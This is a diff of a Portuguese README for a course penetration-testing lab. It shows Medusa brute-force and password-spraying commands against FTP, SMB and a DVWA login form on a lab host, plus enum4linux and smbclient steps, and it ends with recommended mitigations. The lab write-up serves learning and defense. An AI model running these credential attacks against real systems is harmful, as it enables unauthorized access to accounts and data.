@@ -21,29 +21,30 @@ Implementar um laboratório de testes de intrusão para simular cenários reais 
 ### 1. Força Bruta em FTP (Porta 21)
 Execução de ataque de dicionário utilizando o módulo FTP do Medusa para obter acesso administrativo.
 
-medusa -h 192.168.56.102 -u msfadmin -P wordlist.txt -M ftp
+      medusa -h 192.168.56.102 -u msfadmin -P wordlist.txt -M ftp
 
 ### 2. Password Spraying e Exploração de SMB (Porta 445)
 Neste cenário, utilizou-se a técnica de Password Spraying para testar uma única senha contra uma lista de usuários, visando evitar a detecção por sistemas de proteção.
 
-Enumeração de Usuários:
-enum4linux -U 192.168.56.102
+* **Enumeração de Usuários:**
+      enum4linux -U 192.168.56.102
 
-Ataque com Medusa:
-medusa -h 192.168.56.102 -U users.txt -p msfadmin -M smbnt
+* **Ataque com Medusa:**
+      medusa -h 192.168.56.102 -U users.txt -p msfadmin -M smbnt
 
-Pós-Exploração: Com as credenciais obtidas, foi possível navegar pelos diretórios compartilhados.
-smbclient //192.168.56.102/msfadmin -U msfadmin
+* **Pós-Exploração:** Com as credenciais obtidas, foi possível navegar pelos diretórios compartilhados.
+      smbclient //192.168.56.102/msfadmin -U msfadmin
 
-Constatação: Identificou-se uma falha de Broken Access Control, onde o usuário possui permissões excessivas em diretórios sensíveis.
+* **Constatação:** Identificou-se uma falha de Broken Access Control, onde o usuário possui permissões excessivas em diretórios sensíveis.
 
 ### 3. Automação de Formulário Web (DVWA)
-Utilização do Burp Suite para realizar o reconhecimento da aplicação e identificar a "assinatura de erro" necessária para a automação.
 
-Reconhecimento: Através do Repeater, identificou-se que a mensagem de falha é "Username and/or password incorrect.".
+* **BurpSuite:** Utilização do Burp Suite para realizar o reconhecimento da aplicação e identificar a "assinatura de erro" necessária para a automação.
+
+* **Reconhecimento:** Através do Repeater, identificou-se que a mensagem de falha é "Username and/or password incorrect.".
 
 **Ataque Automatizado:**
-medusa -h 192.168.56.102 -u admin -P wordlist.txt -M http -m FORM:"dvwa/vulnerabilities/brute/index.php?username=^USER^&password=^PASS^&Login=Login":"Username and/or password incorrect."
+   medusa -h 192.168.56.102 -u admin -P wordlist.txt -M http -m FORM:"dvwa/vulnerabilities/brute/index.php?username=^USER^&password=^PASS^&Login=Login":"Username     and/or password incorrect."
 
 ### 🛡️ Medidas de Mitigação Recomendadas
 
@@ -58,6 +59,6 @@ medusa -h 192.168.56.102 -u admin -P wordlist.txt -M http -m FORM:"dvwa/vulnerab
 * **Proteção Web:** Implementar Rate Limiting para bloquear IPs após sucessivas falhas e utilizar WAF (Web Application Firewall) para detectar padrões de automação.
 
 📝 Conclusão
-O laboratório demonstrou que a segurança baseada apenas em perímetros de rede é insuficiente se os serviços internos possuírem configurações frágeis. O uso de ferramentas como Medusa e Burp Suite permitiu mapear riscos que, em um ambiente real, poderiam levar ao vazamento de dados críticos. A prática reforçou a necessidade de uma defesa em profundidade e monitoramento contínuo de logs de autenticação.
+      O laboratório demonstrou que a segurança baseada apenas em perímetros de rede é insuficiente se os serviços internos possuírem configurações frágeis. O uso        de ferramentas como Medusa e Burp Suite permitiu mapear riscos que, em um ambiente real, poderiam levar ao vazamento de dados críticos. A prática reforçou a       necessidade de uma defesa em profundidade e monitoramento contínuo de logs de autenticação.
 
-**Desenvolvido como parte do currículo de Cibersegurança da DIO em parceria com a Riachuelo.**
+                     **Desenvolvido como parte do currículo de Cibersegurança da DIO em parceria com a Riachuelo.**
